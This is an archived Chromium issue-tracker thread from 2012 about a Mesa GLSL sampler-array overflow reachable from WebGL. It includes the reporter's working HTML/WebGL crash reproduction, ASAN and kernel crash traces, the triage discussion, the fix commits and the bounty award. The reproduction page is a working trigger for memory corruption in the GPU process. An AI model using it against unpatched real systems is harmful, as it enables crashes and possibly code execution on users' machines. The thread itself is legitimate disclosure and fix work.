# Security: mesa stack scribbling thingamadoo

| Field | Value |
|-------|-------|
| **Issue ID** | [40063240](https://issues.chromium.org/issues/40063240) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P0 |
| **Component** | Blink>WebGL, Internals, Internals>GPU |
| **Platforms** | ChromeOS |
| **Reporter** | mi...@gmail.com |
| **Assignee** | jo...@chromium.org |
| **Created** | 2012-08-10 |
| **Bounty** | $3,133.00 |

## Description

**VULNERABILITY DETAILS**  

<https://bugzilla.mozilla.org/show_bug.cgi?id=777028>

**VERSION**  

Chrome Version: dev  

Operating System: linux64bit

**REPRODUCTION CASE**

<html>
<head>
<script id="vshader" type="x-shader/x-vertex">
void main()
{
vec4 x;
gl\_Position = x;
}
</script>
```
<script id="fshader" type="x-shader/x-fragment">  
  precision mediump float;  
  uniform sampler2D uni[29];  
  void main()  
  {  
    vec4 c;  
    for (int i = 0; i < 2; i++) {  
      c += texture2D(uni[i], vec2(0));  
    }  
  }  
</script>  
<script>  
  function loadShaderFromScript(gl, name, shaderType) {  
    var shader = gl.createShader(shaderType)  
    var shaderSource = document.getElementById(name).text  
    gl.shaderSource(shader, shaderSource)  
    gl.compileShader(shader)  
    return shader  
  }  
  onload = function() {  
    var gl = document.createElement('canvas').getContext("experimental-webgl")  
    var program = gl.createProgram()  
    gl.attachShader(program, loadShaderFromScript(gl, 'vshader', gl.VERTEX_SHADER))  
    gl.attachShader(program, loadShaderFromScript(gl, 'fshader', gl.FRAGMENT_SHADER))  
    gl.linkProgram(program)  
  }  
</script>  

```
 </head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: gpu + asan  

Crash State:  

[3179:3179:1014762883:ERROR:sandbox\_init\_linux.cc(31)] InitializeSandbox() called with multiple threads in process gpu-process  

[3179:3179:1014834080:ERROR:x11\_util.cc(1273)] X Error detected: serial 31, error\_code 8 (BadMatch (invalid parameter attributes)), request\_code 72, minor\_code 0 (X\_PutImage)  

ASAN:SIGSEGV  

==3179== ERROR: AddressSanitizer crashed on unknown address 0x7fff00000187 (pc 0x7fffe74d0563 sp 0x7fffffff7410 bp 0x7fffdfef0a80 T0)  

AddressSanitizer can not provide additional info. ABORTING  

#0 0x7fffe74d0563 in ?? ??:0  

Stats: 16M malloced (23M for red zones) by 77971 calls  

Stats: 0M realloced by 291 calls  

Stats: 10M freed by 60262 calls  

Stats: 0M really freed by 0 calls  

Stats: 64M (16392 full pages) mmaped in 16 calls  

mmaps by size class: 8:81915; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:512; 15:128; 16:64; 17:32; 18:16;  

mallocs by size class: 8:69778; 9:5252; 10:824; 11:1200; 12:272; 13:70; 14:470; 15:52; 16:17; 17:30; 18:6;  

frees by size class: 8:56175; 9:2820; 10:459; 11:173; 12:188; 13:40; 14:338; 15:41; 16:12; 17:14; 18:2;  

rfrees by size class:  

Stats: malloc large: 36 small slow: 294

## Attachments

- [chromium1.html](attachments/chromium1.html) (text/html; charset=us-ascii, 1.1 KB)
- [chromium1.txt](attachments/chromium1.txt) (text/plain; charset=us-ascii, 1.1 KB)
- [ff1.html](attachments/ff1.html) (text/html; charset=us-ascii, 1.1 KB)
- [fix-security](attachments/fix-security) (text/x-c++; charset=us-ascii, 4.8 KB)
- [8.1-array-overflow.patch](attachments/8.1-array-overflow.patch) (text/x-diff; charset=us-ascii, 486 B)
- [wtfgl.html](attachments/wtfgl.html) (text/html; charset=us-ascii, 1.2 KB)

## Timeline

### sc...@gmail.com (2012-08-10)

Jorge, I wonder if you're interested in investigating this one?
From my brief reading of the Mozilla bug, it looks like it's crashing in the underlying Mesa driver code. Presumably this might affect ChromeOS in default configuration?

### sc...@gmail.com (2012-08-10)

[Empty comment from Monorail migration]

### kb...@chromium.org (2012-08-10)

Mozilla provided a test case for this and a patch to Firefox working around the bug, attached. We should probably integrate this workaround into Chrome.


### mi...@gmail.com (2012-08-10)

I should add, I do:

--skip-gpu-data-loading

and maybe --in-process-gpu to help crashing along.

### [Deleted User] (2012-08-10)

Haven't been able to reproduce this locally yet. Seems reasonable to use Mozilla's workaround though.

Miaubiz, does this repro in Stable/Beta or just Dev?

### jo...@chromium.org (2012-08-10)

Not repro-ing on Chrome OS ARM ToT-ish (that's what I had handy).

### mi...@gmail.com (2012-08-10)

@c...: stable is affected also.

the number 29 in the file is a magical minimum number that causes the crash. somewhere around 65k is the maximum. you could try fiddling with that. sometimes I get a hang or chromium refuses to die.

here's the top of xdpyinfo:
name of display:    :0
version number:    11.0
vendor string:    The X.Org Foundation
vendor release number:    11103000
X.Org version: 1.11.3

ASAN:SIGSEGV
==6783== ERROR: AddressSanitizer crashed on unknown address 0x000700000007 (pc 0x000700000007 sp 0x7fffcd07a8f0 bp 0x000700000007 T22)
AddressSanitizer can not provide additional info. ABORTING
    #0 0x700000007

### mi...@gmail.com (2012-08-10)

also crashes non asan build:

[ 8139.464359] chromium-browse[977]: segfault at 700000007 ip 0000000700000007 sp 00007fffffff8ea0 error 14 in chromium-browser[555555554000+4ca9000]

and:

[ 8192.294499] chrome/21079: potentially unexpected fatal signal 11.
[ 8192.294552] RIP: 0033:[<0000000700000007>]  [<0000000700000007>] 0x700000006
[ 8192.294557] RSP: 002b:00007fffffffcdf0  EFLAGS: 00010206
[ 8192.294558] RAX: 0000000000000000 RBX: 0000000700000007 RCX: 0000000700000007
[ 8192.294559] RDX: 0000000700000007 RSI: 000055555a6c8130 RDI: 000055555a6629b0
[ 8192.294560] RBP: 0000000700000007 R08: 0000000000000034 R09: 0101010101010101
[ 8192.294561] R10: 0000000000000001 R11: 00007ffff1f8e4d0 R12: 0000000700000007
[ 8192.294562] R13: 0000000700000007 R14: 0000000700000007 R15: 0000000700000007
[ 8192.294564] FS:  00007ffff7fb29c0(0000) GS:ffff88082fd40000(0000) knlGS:0000000000000000
[ 8192.294565] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 8192.294566] CR2: 0000000700000007 CR3: 00000007cdd8f000 CR4: 00000000000406e0
[ 8192.294567] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 8192.294569] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400

### ma...@chromium.org (2012-08-10)

@https://crbug.com/chromium/141901#c6 you won't repro on ARM which doesn't use mesa

### [Deleted User] (2012-08-13)

Setting impacts flags based on https://crbug.com/chromium/141901#c7

### jo...@chromium.org (2012-08-13)

I'm getting GPU process crashes on ToT Chrome OS on lumpy (x86) with both repros =(. GPU peeps, where in Chrome would one add a check for the number of samplers passed to Mesa?

### pi...@chromium.org (2012-08-13)

Lacking context (don't have access to the mozilla bug). What do you mean "number of samplers passed to mesa"?

### kb...@chromium.org (2012-08-13)

I think the best place would be in ProgramManager::ProgramInfo::Link or nearby, in src/gpu/command_buffer/service/program_manager.cc.


### jo...@chromium.org (2012-08-13)

My context is the same as yours =/. The workaround patch for FF (included in c#3) talks about samplers passed to Mesa:

(From the patch in c#3)

"""
+    // https://crbug.com/chromium/777028
+    // Mesa can't handle more than 16 samplers per program, counting each array entry.
+    if (mIsMesa) {
+        if (program->UpperBoundNumSamplerUniforms() > 16) {
+            GenerateWarning("Programs with more than 16 samplers are disallowed on Mesa drivers "
+                            "to avoid a Mesa crasher.");
+            program->SetLinkStatus(false);
+            return;
+        }
+    }
"""

### pi...@chromium.org (2012-08-13)

So you want to disallow programs that use >16 samplers?
As kbr said, you want to hook that in ProgramManager::ProgramInfo::Link and fail the compilation. How are you going to count samplers though? In the preprocessing/validation step done by ANGLE?

### jo...@chromium.org (2012-08-13)

piman: I have no idea ;-) first step was to try and use the workaround to confirm the bug.

### jo...@chromium.org (2012-08-13)

One more question: running the repro shows a lot of crashes in about:gpu, but none of them show up on about:crashes. Is that expected behaviour? This is an official Chrome OS build with crash reporting enabled (e.g. about:crash shows up in about:crashes and in http://crash).

### kb...@chromium.org (2012-08-13)

I don't know whether the fact that GPU process crashes don't show up in about:crashes is accidental or by design, but it's certainly annoying when diagnosing problems like this. jbates, should we file a bug about that?


### jb...@chromium.org (2012-08-14)

I've never used about:crash, but based on the name it seems like it should include all chrome process crashes.

### mi...@gmail.com (2012-08-14)

I don't know what a sampler is, but the number of samplers >16 is referring to this line:

      uniform sampler2D uni[29];

where 29 is the number of samplers in the example.



### pi...@chromium.org (2012-08-14)

Right, but to extract that number out of the shader source code, you need to parse it. Even if you let GL compile it (is it where it crashes? or on use?), it still doesn't have an API to give you that info.

So to workaround the problem in Chrome, we need to parse the shader code ourselves (using ANGLE?), extract the information, and decide that there's too many samplers and give up.

Alternatively we can fix the problem in the driver in Mesa, and backport in Chrome OS. On linux we can blacklist mesa drivers (don't we already?) prior to the version that has the fix.

### zm...@chromium.org (2012-08-14)

We actually let out 8.* mesa drivers in Linux on a bunch of Intel GPUs as they pass most WebGL conformance tests.

### ma...@chromium.org (2012-08-15)

Attached is the mesa fix. I also have a Chrome OS fix ready.

What's the next step? I can push it to mesa git, but I'm wondering if everyone is ok with that given that this bug is handled in a private manner.

### kb...@chromium.org (2012-08-15)

I'd say just put the fix out there. It will have to be integrated at some point.

Are you sure that's the correct fix, though? Just clamping the sampler's uniform location doesn't seem right to me -- if the shader requests more samplers than the implementation supports then something should fail (probably program linking?), not silently succeed but render incorrectly.


### ma...@chromium.org (2012-08-15)

Well, the MAX_SAMPLERS limit is mesa-wide. We can't just return more that MAX_SAMPLERS samplers and expect the rest of the stack to work. In the end I think there are two issues:
- we run past the end of the sampler array
- we don't have enough samplers

The patch fixes #1, we (mesa) can still bump MAX_SAMPLERS in the future.

### ma...@chromium.org (2012-08-15)

Oh and of course, bumping MAX_SAMPLERS will have interesting consequences in the drivers, so it's no simple matter. That's the reason I don't want to handle this here.

### jo...@chromium.org (2012-08-15)

Do we need to something on our side to pull the new Mesa version once the fix is applied upstream?

### bu...@chromium.org (2012-08-15)

Commit: 4f4ddfd4bd68b72ba4cb9706c7a17d1af96e1386
 Email: marcheu@chromium.org

Mesa: Add a fix for mesa sampler array overflow.

Fixes a crash when we have too many samplers.

BUG=chromium:141901
TEST=by hand

Change-Id: I4bfb9ad5ff8bfe7db0079e95fa04dac336b59bb7
Reviewed-on: https://gerrit.chromium.org/gerrit/30364
Tested-by: Stéphane Marchesin <marcheu@chromium.org>
Reviewed-by: Jorge Lucangeli Obes <jorgelo@chromium.org>
Commit-Ready: Stéphane Marchesin <marcheu@chromium.org>

A	media-libs/mesa/files/8.1-array-overflow.patch
D	media-libs/mesa/mesa-8.1.0-r8.ebuild
A	media-libs/mesa/mesa-8.1.0-r9.ebuild
M	media-libs/mesa/mesa-9999.ebuild

### jo...@chromium.org (2012-08-15)

We should merge this to 22 and 21.

### sc...@gmail.com (2012-08-15)

Jorge, I'm going to mark this Critical, since stable Chrome OS does not have a GPU sandbox at this time.

Am I correct that we use Critical in Chrome OS for bugs that manifest in the chronos user account? Of course, this bug isn't enough to silently persist past a reboot, but it could mess with the browser profile and install extensions, right?

### jo...@chromium.org (2012-08-15)

That sounds correct, although with the Pwnium changes to the extension workflow I'm not sure a completely unattended extension install is possible. However, it might be possible to mess with the default extensions list or stuff like that.

Critical seems to be consistent with code execution for the chronos user account. Maybe we need a new category for bugs which allow persistence in Chrome OS, but that's another discussion.

### jo...@chromium.org (2012-08-15)

Backports:
21: https://gerrit.chromium.org/gerrit/#/c/30433/
22: https://gerrit.chromium.org/gerrit/#/c/30434/

### [Deleted User] (2012-08-15)

[Empty comment from Monorail migration]

### jo...@chromium.org (2012-08-16)

TPMs for 21 and 22, I can haz Merge-Approved?

### sc...@gmail.com (2012-08-16)

This is a critical bug, so I'm approving it.

We should get the fix out sooner rather than later. Jorge, when is the next M21 patch for Chrome OS ? Who will merge this?

### jo...@chromium.org (2012-08-16)

M21 refresh is next week, the CL's to merge are up, I'll submit them.

### jo...@chromium.org (2012-08-17)

Merged to 21 and 22 after getting green trybot runs.

### bu...@chromium.org (2012-08-17)

Commit: 372964830d5b6463002a0e8197d4bc4a89c35c73
 Email: marcheu@chromium.org

Mesa: Add a fix for mesa sampler array overflow.

Fixes a crash when we have too many samplers.

BUG=chromium:141901
TEST=by hand

Change-Id: Ie776b7cbdc756b53bfffa11b5f9041f7d63f2333
Reviewed-on: https://gerrit.chromium.org/gerrit/30364
Tested-by: Stéphane Marchesin <marcheu@chromium.org>
Reviewed-by: Jorge Lucangeli Obes <jorgelo@chromium.org>
Commit-Ready: Stéphane Marchesin <marcheu@chromium.org>
Reviewed-on: https://gerrit.chromium.org/gerrit/30433
Tested-by: Jorge Lucangeli Obes <jorgelo@chromium.org>

A	media-libs/mesa/files/8.1-array-overflow.patch
D	media-libs/mesa/mesa-8.1.0-r7.ebuild
A	media-libs/mesa/mesa-8.1.0-r8.ebuild
M	media-libs/mesa/mesa-9999.ebuild

### [Deleted User] (2012-08-17)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-08-20)

Commit: 42836814473ecb24fed6a21a792734ef7f5ba60b
 Email: marcheu@chromium.org

Mesa: Add a fix for mesa sampler array overflow.

Fixes a crash when we have too many samplers.

BUG=chromium:141901
TEST=by hand

Change-Id: Id7bfacf83ee1c10855dd746b4870ccce205ff079
Reviewed-on: https://gerrit.chromium.org/gerrit/30364
Tested-by: Stéphane Marchesin <marcheu@chromium.org>
Reviewed-by: Jorge Lucangeli Obes <jorgelo@chromium.org>
Commit-Ready: Stéphane Marchesin <marcheu@chromium.org>
Reviewed-on: https://gerrit.chromium.org/gerrit/30434
Tested-by: Jorge Lucangeli Obes <jorgelo@chromium.org>

A	media-libs/mesa/files/8.1-array-overflow.patch
D	media-libs/mesa/mesa-8.1.0-r8.ebuild
A	media-libs/mesa/mesa-8.1.0-r9.ebuild
M	media-libs/mesa/mesa-9999.ebuild

### sc...@gmail.com (2012-08-20)

@miaubiz: very interesting bug you found here. The new seccomp-BPF stuff we have mitigates this down to "High" but given that M21 doesn't (AFAIK) have it turned on, we're going to pay out at the $3133.7 level -- congrats :)

If you wanted to spend more time fuzzing against the Mesa GPU backend, it could be profitable? I'm not sure anyone has written a kick-ass grammar-based fuzzer yet?

### sc...@gmail.com (2012-08-21)

[Empty comment from Monorail migration]

### jo...@chromium.org (2012-08-22)

Marking as fixed since we started pushing R21 today with the fix.

### kr...@chromium.org (2012-08-22)

[Empty comment from Monorail migration]

### [Deleted User] (2012-08-22)

Is there any QA steps for verification?

### mi...@gmail.com (2012-08-29)

I am still seeing this if I reload the tab quickly or open multiple tabs with the repro



### mi...@gmail.com (2012-08-29)

ASAN:SIGSEGV
=================================================================
==11483== ERROR: AddressSanitizer crashed on unknown address 0x7fff00000187 (pc 0x7fffe74c55c8 sp 0x7fffffff6ed0 bp 0x7fffdffa8e80 T0)
AddressSanitizer can not provide additional info.
    #0 0x7fffe74c55c8 (/usr/lib/x86_64-linux-gnu/dri/libglsl.so+0x6c5c8)
Stats: 16M malloced (22M for red zones) by 74949 calls
Stats: 0M realloced by 291 calls
Stats: 9M freed by 57231 calls
Stats: 0M really freed by 0 calls
Stats: 64M (16392 full pages) mmaped in 16 calls
  mmaps   by size class: 8:81915; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:512; 15:128; 16:64; 17:32; 18:16; 
  mallocs by size class: 8:66753; 9:5252; 10:826; 11:1201; 12:272; 13:70; 14:470; 15:52; 16:17; 17:30; 18:6; 
  frees   by size class: 8:53144; 9:2820; 10:458; 11:174; 12:188; 13:40; 14:338; 15:41; 16:12; 17:14; 18:2; 
  rfrees  by size class: 
Stats: malloc large: 36 small slow: 288
==11483== ABORTING



### jo...@chromium.org (2012-08-29)

miaubiz: This was only fixed on Chrome OS. Are you testing on Chrome OS?

### sc...@gmail.com (2012-08-29)

I'm not sure miaubiz has a ChromeOS device? That's an oversight I intend to fix one day :)

### mi...@gmail.com (2012-08-30)

@jorg: ok. thanks. this is going to be a pain going forward :|

### jo...@chromium.org (2012-08-30)

miaubiz: I don't disagree ;-). Our GPU stack did not expose the number of samplers in a way accessible from Chrome code, so that's why the fix had to go in Mesa.

The good thing is that we're upstreaming to Mesa in parallel with fixing in Chrome OS.

Most of these bugs should also reproduce in Chromium OS, which you can run in a VM using Hexxeh's images.

### sc...@gmail.com (2012-09-12)

[Empty comment from Monorail migration]

### kr...@chromium.org (2012-09-19)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-07-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/third_party/mesa/+/4a87b3221cabe0ae76ac0ed017bbc7e86a88a90e

commit 4a87b3221cabe0ae76ac0ed017bbc7e86a88a90e
Author: Stéphane Marchesin <marcheu@chromium.org>
Date: Wed Jul 26 01:34:20 2017

CHROMIUM: glsl: Avoid crash when overflowing the samplers array

Fixes a crash when we have too many samplers.

BUG=chromium:141901
TEST=by hand

Signed-off-by: Prince Agyeman <prince.agyeman@intel.com>
Signed-off-by: Dhinakaran Pandiyan <dhinakaran.pandiyan@intel.com>
Signed-off-by: James Ausmus <james.ausmus@intel.com>
(applied manually from src/third_party/media-libs/mesa/files)

BUG=b:33533853
TEST=No CTS regressions on Cyan and Reef.

Signed-off-by: Tomasz Figa <tfiga@chromium.org>
Change-Id: I5a997d65080fee8f4536cca86f06a38af3786682
Reviewed-on: https://chromium-review.googlesource.com/558122
Reviewed-by: Chad Versace <chadversary@chromium.org>

[modify] https://crrev.com/4a87b3221cabe0ae76ac0ed017bbc7e86a88a90e/src/compiler/glsl/link_uniforms.cpp


### bu...@chromium.org (2017-11-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/third_party/mesa/+/403ab711523bc8cdb054f9c31b2ac9025ff4f74a

commit 403ab711523bc8cdb054f9c31b2ac9025ff4f74a
Author: Stéphane Marchesin <marcheu@chromium.org>
Date: Wed Nov 22 15:45:37 2017

CHROMIUM: glsl: Avoid crash when overflowing the samplers array

Fixes a crash when we have too many samplers.

BUG=chromium:141901
TEST=by hand

Signed-off-by: Prince Agyeman <prince.agyeman@intel.com>
Signed-off-by: Dhinakaran Pandiyan <dhinakaran.pandiyan@intel.com>
Signed-off-by: James Ausmus <james.ausmus@intel.com>
(applied manually from src/third_party/media-libs/mesa/files)

BUG=b:33533853
TEST=No CTS regressions on Cyan and Reef.

Signed-off-by: Tomasz Figa <tfiga@chromium.org>
Change-Id: I5a997d65080fee8f4536cca86f06a38af3786682
Reviewed-on: https://chromium-review.googlesource.com/558122
Reviewed-by: Chad Versace <chadversary@chromium.org>
(cherry picked from commit 4a87b3221cabe0ae76ac0ed017bbc7e86a88a90e)

BUG=b:69553386
TEST=No regressions on Eve in `cts-tradefed run cts -m CtsDeqpTestCases`.

Change-Id: I9eafec1dee5ee2e9b156cffa4731212d83585240
Reviewed-on: https://chromium-review.googlesource.com/780785
Tested-by: Chad Versace <chadversary@chromium.org>
Commit-Queue: Chad Versace <chadversary@chromium.org>
Reviewed-by: Gurchetan Singh <gurchetansingh@chromium.org>

[modify] https://crrev.com/403ab711523bc8cdb054f9c31b2ac9025ff4f74a/src/compiler/glsl/link_uniforms.cpp


### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-07-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/third_party/mesa/+/f408dc0e460edad50f1ef8032628c885604881f4

commit f408dc0e460edad50f1ef8032628c885604881f4
Author: Stéphane Marchesin <marcheu@chromium.org>
Date: Thu Jul 12 18:17:20 2018

CHROMIUM: glsl: Avoid crash when overflowing the samplers array

Fixes a crash when we have too many samplers.

BUG=chromium:141901
TEST=by hand

Signed-off-by: Prince Agyeman <prince.agyeman@intel.com>
Signed-off-by: Dhinakaran Pandiyan <dhinakaran.pandiyan@intel.com>
Signed-off-by: James Ausmus <james.ausmus@intel.com>
(cherry picked from commit 403ab711523bc8cdb054f9c31b2ac9025ff4f74a)

BUG=b:77235812
TEST=emerge-grunt arc-mesa; emerge-eve arc-mesa

Change-Id: I8ffebdae3bdab68da4277193fe367959ab719796
Reviewed-on: https://chromium-review.googlesource.com/1105702
Commit-Queue: Chad Versace <chadversary@chromium.org>
Tested-by: Chad Versace <chadversary@chromium.org>
Reviewed-by: Stéphane Marchesin <marcheu@chromium.org>

[modify] https://crrev.com/f408dc0e460edad50f1ef8032628c885604881f4/src/compiler/glsl/link_uniforms.cpp


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-02-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/overlays/chromiumos-overlay/+/3d7865c216bbbbcbb807358f478ee2a58e0c75bf

commit 3d7865c216bbbbcbb807358f478ee2a58e0c75bf
Author: Kristian H. Kristensen <hoegsberg@chromium.org>
Date: Fri Feb 22 19:01:07 2019

mesa: Drop 8.1-array-overflow.patch

Fixed in ff996cafce511dd ("glsl/linker: Avoid buffer over-run in
parcel_out_uniform_storage::visit_field").  The fix has been in mesa
for a long time; let's drop this patch.

BUG=chromium:141901
TEST=webgl test case in bug

Change-Id: I5e58435d4887cda5b14e5cd3203d89085146373b
Reviewed-on: https://chromium-review.googlesource.com/1479867
Commit-Ready: ChromeOS CL Exonerator Bot <chromiumos-cl-exonerator@appspot.gserviceaccount.com>
Tested-by: Kristian H. Kristensen <hoegsberg@chromium.org>
Reviewed-by: Stéphane Marchesin <marcheu@chromium.org>

[rename] https://crrev.com/3d7865c216bbbbcbb807358f478ee2a58e0c75bf/media-libs/mesa/mesa-18.2_pre1-r29.ebuild
[modify] https://crrev.com/3d7865c216bbbbcbb807358f478ee2a58e0c75bf/media-libs/mesa/mesa-9999.ebuild
[modify] https://crrev.com/3d7865c216bbbbcbb807358f478ee2a58e0c75bf/media-libs/mesa/mesa-18.2_pre1.ebuild
[delete] https://crrev.com/ffd61ae2c569d1f0570da1996e00cc6155c9736e/media-libs/mesa/files/8.1-array-overflow.patch


### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-06)

This issue was migrated from crbug.com/chromium/141901?no_tracker_redirect=1

[Multiple monorail components: Blink>WebGL, Internals, Internals>GPU]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40063240)*
